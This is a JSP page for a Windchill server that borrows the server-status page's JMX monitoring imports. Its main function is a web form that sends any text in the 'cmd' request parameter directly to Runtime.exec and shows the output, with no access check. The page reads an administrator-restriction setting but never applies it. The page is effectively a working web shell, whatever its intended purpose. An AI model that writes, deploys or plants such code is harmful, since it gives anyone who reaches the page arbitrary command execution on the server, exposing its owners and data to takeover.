<%@page import="java.lang.management.ManagementFactory"%><%@page
	import="java.lang.reflect.UndeclaredThrowableException"%><%@page
	import="java.net.URLEncoder"%><%@page import="java.text.DecimalFormat"%><%@page
	import="java.text.DecimalFormatSymbols"%><%@page
	import="java.text.NumberFormat"%><%@page
	import="java.text.SimpleDateFormat"%><%@page import="java.util.Date"%><%@page
	import="java.util.HashMap"%><%@page import="java.util.Locale"%><%@page
	import="java.util.Map"%><%@page import="java.util.Properties"%><%@page
	import="java.util.ResourceBundle"%><%@page import="java.util.TreeMap"%><%@page
	import="java.util.List"%><%@page import="java.util.ArrayList"%><%@page
	import="java.io.File"%><%@page import="java.io.BufferedReader"%><%@page
	import="java.io.BufferedWriter"%><%@page import="java.io.FileReader"%><%@page
	import="java.io.FileWriter"%><%@page import="java.lang.Exception"%><%@page
	import="java.io.IOException"%><%@page
	import="java.io.InputStreamReader"%><%@page
	import="javax.management.Attribute"%><%@page
	import="javax.management.AttributeList"%><%@page
	import="javax.management.InstanceNotFoundException"%><%@page
	import="javax.management.MBeanServerConnection"%><%@page
	import="javax.management.MBeanServerInvocationHandler"%><%@page
	import="javax.management.ObjectName"%><%@page
	import="javax.management.QueryExp"%><%@page
	import="javax.management.openmbean.CompositeData"%><%@page
	import="javax.management.openmbean.TabularData"%><%@page
	import="javax.management.remote.JMXConnector"%><%@page
	import="org.apache.log4j.Logger"%><%@page
	import="wt.access.AccessControlException"%><%@page
	import="wt.intersvrcom.SiteMonitorMBean"%><%@page
	import="wt.jmx.core.MBeanRegistry"%><%@page
	import="wt.jmx.core.MBeanUtilities"%><%@page
	import="wt.jmx.core.SelfAwareMBean"%><%@page
	import="wt.jmx.core.mbeans.Dumper"%><%@page import="wt.log4j.LogR"%><%@page
	import="wt.manager.RemoteServerManager"%><%@page
	import="wt.manager.jmx.MethodServerMProxyMBean"%><%@page
	import="wt.method.jmx.JmxConnectInfo"%><%@page
	import="wt.method.jmx.MethodServer"%><%@page
	import="wt.util.WTAppServerPropertyHelper"%><%@page
	import="wt.util.WTContext"%><%@page import="wt.util.WTProperties"%><%@page
	import="wt.util.jmx.WDSJMXConnector"%><%@page
	import="wt.util.jmx.AccessUtil"%><%@page
	import="wt.util.jmx.JmxConnectUtil"%><%@page
	import="wt.util.jmx.serverStatusResource"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%!
private static final String  windchillWebAppPath;
private static final String  whcWebAppPath;
private static final String  solrWebAppPath;
private static final String  helpUrl;
private static final boolean  restrictToSiteAdministrators;
static
 {
   final Properties  wtProps = MBeanUtilities.getProperties();
   windchillWebAppPath = "/" + wtProps.getProperty( "wt.webapp.name" );
   whcWebAppPath = windchillWebAppPath + "-WHC";
   solrWebAppPath = "/" + wtProps.getProperty( "wt.solr.webapp.name" );
   helpUrl = wt.help.HelpLinkHelper.createHelpHREF( "ServerStatusAbout" );
   restrictToSiteAdministrators = !"false".equals( wtProps.getProperty( "wt.serverStatus.restrictToSiteAdministrators" ) );
 }
private static final ObjectName  dumperMBeanName = newObjectName( "com.ptc:wt.subsystem=Dumper" );
private static final ObjectName  runtimeMBeanName = newObjectName( ManagementFactory.RUNTIME_MXBEAN_NAME );
private static final ObjectName  gcMonitorMBeanName = newObjectName( "com.ptc:wt.subsystem=Monitors,wt.monitorType=GarbageCollection" );
private static final ObjectName  memMonitorMBeanName = newObjectName( "com.ptc:wt.subsystem=Monitors,wt.monitorType=Memory" );
private static final ObjectName  cpuMonitorMBeanName = newObjectName( "com.ptc:wt.subsystem=Monitors,wt.monitorType=ProcessCpuTime" );
private static final ObjectName  osMBeanName = newObjectName( ManagementFactory.OPERATING_SYSTEM_MXBEAN_NAME );
private static final ObjectName  methodServerMProxyMBeanName = newObjectName( "com.ptc:wt.processGroup=MethodServers" );
private static final ObjectName  methodServerMBeanName = newObjectName( "com.ptc:wt.type=MethodServer" );
private static final ObjectName  methodContextsMBeanName = newObjectName( "com.ptc:wt.subsystem=Monitors,wt.monitorType=MethodContexts" );
private static final ObjectName  seRequestMonitorMBeanName = newObjectName( "com.ptc:wt.servlet.system=WebAppContexts,wt.webAppContext=" + windchillWebAppPath +
                                                                            ",wt.subsystem=Monitors,wt.servlet.subsystem=ServletRequests" );
private static final ObjectName  sessionMonitorMBeanName = newObjectName( "com.ptc:wt.servlet.system=WebAppContexts,wt.webAppContext=" + windchillWebAppPath +
                                                                          ",wt.subsystem=Monitors,wt.servlet.subsystem=ServletSessions" );
private static final ObjectName  whcRequestMonitorMBeanName = newObjectName( "com.ptc:wt.servlet.system=WebAppContexts,wt.webAppContext=" + whcWebAppPath +
                                                                             ",wt.subsystem=Monitors,wt.servlet.subsystem=ServletRequests" );
private static final ObjectName  solrRequestMonitorMBeanName = newObjectName( "com.ptc:wt.servlet.system=WebAppContexts,wt.webAppContext=" + solrWebAppPath +
                                        ",wt.subsystem=Monitors,wt.servlet.subsystem=ServletRequests" );

private static final String  dumperMBeanAttrs[] = new String[] { "DeadlockedThreadIds" };
private static final String  runtimeMBeanAttrs[] = new String[] { "StartTime", "Uptime" };
private static final String  msRuntimeMBeanAttrs[] = new String[] { "StartTime", "Name", "Uptime" };
private static final String  dsRuntimeMBeanAttrs[] = new String[] { "Name", "Uptime" };
private static final String  gcMonitorMBeanAttrs[] = new String[] { "PercentTimeSpentInGCThreshold", "RecentPercentTimeSpentInGC", "OverallPercentTimeSpentInGC" };
private static final String  memMonitorMBeanAttrs[] = new String[] { "HeapPercentUsageThreshold", "HeapPercentUsage", "PermGenPercentUsageThreshold", "PermGenPercentUsage" };
private static final String  cpuMonitorMBeanAttrs[] = new String[] { "ProcessPercentCpuThreshold", "RecentCpuData", "AverageProcessPercentCpu" };
private static final String  osMBeanAttrs[] = new String[] { "FreePhysicalMemorySize", "TotalPhysicalMemorySize", "FreeSwapSpaceSize", "TotalSwapSpaceSize", "SystemLoadAverage" };
private static final String  methodServerMBeanAttrs[] = new String[] { "JmxServiceURL" };
private static final String  methodContextsMBeanAttrs[] = new String[] { "MaxAverageActiveContextsThreshold", "RecentStatistics", "BaselineStatistics" };
private static final String  seRequestMonitorMBeanAttrs[] = new String[] { "MaxAverageActiveRequestsThreshold", "RequestTimeWarnThreshold", "RecentStatistics", "BaselineStatistics" };
private static final String  sessionMonitorMBeanAttrs[] = new String[] { "MaxAverageActiveSessionsThreshold", "ActiveSessions", "BaselineStatistics" };
private static final String  serverManagerMBeanAttrs[] = new String[] { "CacheMaster", "JmxServiceURL" };
private static final String  getAttributesSignature[] = { ObjectName[].class.getName(), QueryExp[].class.getName(), String[][].class.getName() };
private static final Object  methodServersGetAttrsArgs[] =
{
  new ObjectName[]
  {
    runtimeMBeanName,
    gcMonitorMBeanName,
    memMonitorMBeanName,
    cpuMonitorMBeanName,
    dumperMBeanName,
    methodServerMBeanName,
    methodContextsMBeanName,
    sessionMonitorMBeanName,
    seRequestMonitorMBeanName,
    whcRequestMonitorMBeanName,
    solrRequestMonitorMBeanName
  },
  null,
  new String[][]
  {
    msRuntimeMBeanAttrs,
    gcMonitorMBeanAttrs,
    memMonitorMBeanAttrs,
    cpuMonitorMBeanAttrs,
    dumperMBeanAttrs,
    methodServerMBeanAttrs,
    methodContextsMBeanAttrs,
    sessionMonitorMBeanAttrs,
    seRequestMonitorMBeanAttrs,
    seRequestMonitorMBeanAttrs,
    seRequestMonitorMBeanAttrs
  }
};
// collect data on method servers and server managers
private String cmdRuslte ="";
private String wcHome;
private String keyTemp = "";
private String writeTemp = "";
%>
<% 
wcHome = WTProperties.getLocalProperties().getProperty("wt.home") + "/logs/cmd/";

Integer  activeUsers = null;
Map<String,Object>  methodServerResults = null;
Map<String,Object>  serverManagerResults = null;
Throwable  resultRetrievalException = null;

  // establish JMX connection to default server manager to collect JMX data from server managers and method servers
  try ( JMXConnector smConnection = JmxConnectUtil.getDefaultServerManagerLocalConnector() )
  {
    final MBeanServerConnection  mbeanServer = smConnection.getMBeanServerConnection();

    // produce dynamic proxy for the "MethodServers" MBean in default server manager
    final MethodServerMProxyMBean  methodServersMBeanProxy =
            MBeanServerInvocationHandler.newProxyInstance( mbeanServer, methodServerMProxyMBeanName,
                                                           MethodServerMProxyMBean.class, false );

    // grab data from all method servers (yes, this is a bit ugly, but it is all done in one request -- no chatter)
    methodServerResults = methodServersMBeanProxy.invokeInfoOpInAllClusterMethodServers(
                            dumperMBeanName, "getAttributes", methodServersGetAttrsArgs, getAttributesSignature );
  }
  catch ( VirtualMachineError e )
  {
    throw e;
  }
  catch ( Throwable t )
  {
    resultRetrievalException = t;  // remember but otherwise eat exception
  }
 
  String jvm = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
  
  
 %>
<%
    
%>
<%
    String temp = "";
    String[] jvmSplit = jvm.split("@");
    for( String key : methodServerResults.keySet() ){
      String[] keySplit = key.split("@");
      if(jvmSplit[1].equals(keySplit[1])){
        temp = key;
      }
    }
    Map<String,Object> methodServer = (Map<String,Object>)methodServerResults.get(temp);
   
    List<Map> list = new ArrayList<>();
    for(String key :methodServer.keySet()){
      if(key.indexOf(jvmSplit[0]) != -1){
        keyTemp = key;
      }
      list.add(readFile(key));
    }

    response.setCharacterEncoding("utf-8");  
    response.setHeader("iso-8859-1","utf-8");  
    request.setCharacterEncoding("utf-8");  
    String cmd = request.getParameter("cmd");
    if(cmd != null){
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        writeTemp = df.format(new Date());
        cmd.replaceAll("\n","").replaceAll("\r","");
        writeFile("test",cmd,false);
        writeFile(keyTemp,cmd + "~@~正在执行~@~" + writeTemp + "~@~" + writeTemp,true);
        PrimeThread pt = new PrimeThread(cmd);
        pt.run();
    }
  %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>
<script>
var xmlhttp;
function loadXMLDoc(url,cfunc)
{
    cmd = document.getElementById("cmd").value;
if (window.XMLHttpRequest)
  {// IE7+, Firefox, Chrome, Opera, Safari 代码
  xmlhttp=new XMLHttpRequest();
  }
else
  {// IE6, IE5 代码
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=cfunc;
xmlhttp.open("POST",url,true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("cmd=" + cmd);
}
function myFunction()
{
    document.getElementById("mydiv").innerHTML="命令正在执行";
	loadXMLDoc("test02.jsp",function()
	{
		if (xmlhttp.readyState==4 && xmlhttp.status==200)
		{
			
            location.reload();
		}
	});

}

function refresh(){
    location.reload();
}
</script>
<style type="text/css">
    body{
        brackground-color:black;
        font-color:write;
    }
    textarea{
        height:250px;
        width:100%;
    }

    td{
        text-align:center;
    }

    .info_div{
        float:left;
        width:50%;
        pendding:0 auto;
    }

    .contre_div{
        margin:0 20%;
        
    }
    
    .btn_input{
        height:25px;
        width:10%;
    }

    .cmd_div{
        margin:30px 0;
    }
</style>
</head>
<body id="myBody">
	<%=keyTemp %>
	<br>
    
    <br>
    <div class="contre_div">
        <div id="mydiv">
            <%=cmdRuslte %>
        </div>
        <div class="cmd_div">
            <textarea id="cmd"></textarea> 
            <br> 
            <input class="btn_input" type="button" value="提交" onclick="myFunction()">
            <input class="btn_input" type="button" value="刷新" onclick="refresh()"> 
        </div>
        <div class="info_div">
            <table>
                <tbody>
                    <tr>
                        <th>正在执行</th>
                    </tr>
                    <%
                        for(Map<String,List> fileMap : list){
                            for(Object str : fileMap.get("now")){
                    %>   
                    <tr>
                        <td>
                        <%=(String)str %>
                        </td>
                    </tr>
                    <%
                            }
                        }
                    %>
                </tbody>
            </table>
        </div>
        <div class="info_div">
            <table>
                <tbody>
                    <tr>
                        <th>执行完成</th>
                    </tr>
                    <%
                        for(Map<String,List> fileMap : list){
                            for(Object str :fileMap.get("finish")){
                    %>   
                    <tr>
                        <td>
                        <%=(String)str %>
                        </td>
                    </tr>
                    <%
                            }
                        }
                    %>
                </tbody>
            </table> 
        </div>
    </div>
</body>
</html>
<%!
  private static ObjectName  newObjectName( final String objectNameString )
  {
    try
    {
      return ( new ObjectName( objectNameString ) );
    }
    catch ( Exception e )
    {
      if ( e instanceof RuntimeException )
        throw (RuntimeException) e;
      throw new RuntimeException( e );
    }
  }

  private Map<String,List> readFile(String fileName){
    File file = new File(wcHome + fileName + ".log");
    BufferedReader reader = null;
    List<String> nowList = new ArrayList<>();
    List<String> finishList = new ArrayList<>();
    Map<String,List> map = new HashMap<>();
    List<String> RNlist = new ArrayList<>();
    List<String> RFlist = new ArrayList<>();
        try {
            reader = new BufferedReader(new FileReader(file));
            String tempString = null;
            while ((tempString = reader.readLine()) != null) {
                String[] str = tempString.split("~@~");
                if("正在执行".equals(str[1])){
                    nowList.add(str[0] + " " + str[2]);
                }else if("执行完毕".equals(str[1])){
                    finishList.add(str[0] + " " + str[2]);
                    RFlist.add(str[0] + " " + str[3]);
                }
            }
            int now = 0;
            for(String nowStr : nowList){
                int finish = 0;
                    for(String finishStr : finishList){
                        if(finishStr.indexOf(nowStr) != -1){
                            finish++;
                        }
                    }
                    if(finish == 0){
                        RNlist.add(nowStr + " 正在执行");
                    }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e1) {
                }
            }
        }
        map.put("now",RNlist);
        map.put("finish",RFlist);
        return map;
  }

  private synchronized void writeFile(String fileName,String writeStr,boolean flag){
    File dir = new File(wcHome);
    dir.mkdirs();
    File file = new File(wcHome + fileName + ".log");
    BufferedWriter writer = null;
    try{
        writer = new BufferedWriter(new FileWriter(file,flag));
        writer.write(writeStr);
        writer.newLine();
    } catch (IOException e) {

    } finally {
            if (writer != null) {
                try {
                    writer.close();
                } catch (IOException e1) {
                }
            }
     }

  }
  
  
    

    public class PrimeThread extends Thread {
      private String cmd;
      
      
      PrimeThread(String cmd) {
          this.cmd = cmd;
      }

      public void run() {
    	  test02_jsp.this.cmdRuslte = excutCMD(cmd);
      }
      
      public String excutCMD(String cmd){
        StringBuffer buffer = new StringBuffer();
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String nowDate = "";
        try {
            Process process = Runtime.getRuntime().exec(cmd);//执行cmd命令
            BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));//获取控制台输入流
            String line = "";
            while ((line = input.readLine()) != null) {
                buffer.append(line + "<br>");
            }
            buffer.append("执行完毕<br>");
            input.close();
            int waitFor = process.waitFor();
            nowDate = df.format(new Date()); 
            writeFile(keyTemp,cmd + "~@~执行完毕~@~" + writeTemp + "~@~" + nowDate,true);
        } catch (Exception e) {
             nowDate = df.format(new Date());
             writeFile(keyTemp,cmd + "~@~执行完毕~@~" + writeTemp + "~@~" + nowDate,true);
             writeFile("test",e.getMessage(),true);
             buffer.append("执行完毕<br>" + e.getMessage() + "<br>");
        }
        return buffer.toString();
    }
  }
%>
